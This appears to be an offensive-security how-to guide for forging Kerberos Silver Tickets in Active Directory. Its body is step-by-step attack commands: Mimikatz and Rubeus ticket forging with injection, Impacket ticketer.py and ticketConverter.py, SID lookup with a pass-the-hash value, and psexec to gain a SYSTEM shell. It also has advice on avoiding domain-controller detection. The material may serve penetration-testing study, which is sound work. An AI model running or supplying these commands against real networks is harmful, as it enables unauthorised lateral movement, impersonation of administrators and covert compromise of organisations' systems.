# Silver Ticket: Complete Guide

A Silver Ticket is a forged Kerberos Service Ticket (TGS) that allows you to access a specific service on a specific machine without needing the domain controller or the `krbtgt` hash.

---

## When to Use Silver Tickets

### Use When:
* You have the service account's NTLM hash (e.g., from Kerberoasting).
* You need access to a specific service (not the whole domain).
* You are on a machine and want to move laterally.
* The target machine's service is running under a known account.
* You do not have Domain Admin privileges but have a service account hash.
* You want to avoid detection (does not contact the Domain Controller for validation).

### Don't Use When:
* You have Domain Admin privileges (use a Golden Ticket instead).
* You need access to ALL services on a machine (use a Golden Ticket).
* You do not possess the target service account's hash.

---

## Why Use Silver Tickets?

| Reason | Explanation |
| :--- | :--- |
| **No DC Contact** | Service tickets are validated locally by the target service, not the Domain Controller. |
| **Less Detection** | No TGS request logs (Event ID 4769) are generated on the DC (only local logs on the target host). |
| **Works with Any Account** | You only need the service account's hash to forge access. |
| **Persistence** | The ticket remains functional even if the active account password changes (provided you use the correct corresponding hash). |
| **Quick Access** | Bypasses the requirement to crack complex passwords into cleartext. |

---

## How Many Ways to Create Silver Tickets?

There are 5 main methods commonly utilized to generate and leverage Silver Tickets:

### Method 1: Mimikatz (Windows - Most Common)

#### Syntax:
```powershell
mimikatz.exe "kerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> /target:<TARGET_HOST> /service:<SERVICE> /rc4:<NTLM_HASH> /user:<USER_TO_IMPERSONATE> /ptt" exit

# Get Domain SID
whoami /user
# Output SID: S-1-5-21-3623811015-3361044348-30300820-1001

# Create Silver Ticket for CIFS (SMB) on TEST as Administrator
mimikatz.exe "kerberos::golden /domain:resourced.local /sid:S-1-5-21-3623811015-3361044348-30300820 /target:test.local /service:cifs /rc4:19a3a7550ce8c505c2d46b5e39d6f808 /user:Administrator /ptt" exit

# Verify the ticket injection
klist

# Access target host file share
dir \\test.local\C$
```

### Method 2: Rubeus (Windows - Alternative)
#### Syntax:
```powershell
Rubeus.exe silver /domain:<DOMAIN> /sid:<DOMAIN_SID> /target:<TARGET_HOST> /service:<SERVICE> /rc4:<NTLM_HASH> /user:<USER> /ptt

# Example:
Rubeus.exe silver /domain:resourced.local /sid:S-1-5-21-3623811015-3361044348-30300820 /target:test.local /service:cifs /rc4:19a3a7550ce8c505c2d46b5e39d6f808 /user:Administrator /ptt
```

### Method 3: Impacket `ticketer.py` (Linux)
#### Syntax:
```bash
ticketer.py -domain <DOMAIN> -domain-sid <DOMAIN_SID> -nthash <NTLM_HASH> -spn <SERVICE>/<TARGET_HOST> <USER>

# Generate the ticket cache file
ticketer.py -domain resourced.local -domain-sid S-1-5-21-3623811015-3361044348-30300820 -nthash 19a3a7550ce8c505c2d46b5e39d6f808 -spn cifs/test.local Administrator

# Set the environment variable to use the ticket
export KRB5CCNAME=$(pwd)/Administrator.ccache

# Authenticate using Kerberos authentication without a password
impacket-psexec resourced/Administrator@test.local -k -no-pass
```

### Method 4: Impacket `ticketConverter.py` (Linux - Convert Tickets)
```bash
If you already possess a .kirbi file extracted from a Windows environment, it can be converted for Linux compatibility:

# Convert .kirbi to .ccache
ticketConverter.py ticket.kirbi ticket.ccache

# Load and execute via Kerberos
export KRB5CCNAME=$(pwd)/ticket.ccache
impacket-psexec resourced/Administrator@test.local -k -no-pass
```

# Services You Can Target

| Service | Authorized Access Gained | Verification Example Command |
|---------|---------------------------|------------------------------|
| **cifs** | SMB access (file shares, administrative utilities) | `dir \\target\C$` |
| **http** | Web interface interaction (IIS, WinRM-over-HTTP) | PowerShell Remoting |
| **wsman** | WinRM access (PowerShell Management) | `Enter-PSSession -ComputerName targethost` |
| **RDP** | Remote Desktop Protocol connection capability | `mstsc /v:target` |
| **krbtgt** | **Note:** Used for Golden Tickets, **not** Silver Tickets | Domain Admin privileges |
| **ldap** | Active Directory database queries | `dsquery *` |
| **mssqlsvc** | Microsoft SQL Server instance access | `sqlcmd -S target` |
| **exchange** | Exchange Mail Server control | Automated client mailbox sync |
| **time** | Host system clock synchronization | NTP infrastructure queries |

# Practical Example Scenario

**Context:** You have recovered the **svc_mssql** account hash from a Kerberoasting attack and need to target the server **test.local**.

---

## Step 1: Recover the Domain SID

### Option A: From an Established Windows Session

```cmd
whoami /user
```

### Option B: From an External Linux Platform (Impacket)

```bash
impacket-lookupsid test/testuser@192.168.216.175 \
-hashes :19a3a7550ce8c505c2d46b5e39d6f808
```

**Resulting Domain SID:**

```text
S-1-5-21-3623811015-3361044348-30300820
```

---

## Step 2: Create the Silver Ticket for TEST

### Option A: Linux (Impacket `ticketer.py`)

```bash
ticketer.py \
-domain test.local \
-domain-sid S-1-5-21-3623811015-3361044348-30300820 \
-nthash 19a3a7550ce8c505c2d46b5e39d6f808 \
-spn cifs/test.local \
Administrator

export KRB5CCNAME=$(pwd)/Administrator.ccache
```

### Option B: Windows (Mimikatz)

```powershell
mimikatz.exe "kerberos::golden /domain:resourced.local /sid:S-1-5-21-3623811015-3361044348-30300820 /target:test.local /service:cifs /rc4:19a3a7550ce8c505c2d46b5e39d6f808 /user:Administrator /ptt" exit
```

---

## Step 3: Access the Target Host

### Enumerate Administrative File Shares

```cmd
dir \\test.local\C$
```

### Spawn an Administrative SYSTEM Shell

```cmd
psexec \\test.local -s cmd.exe
```
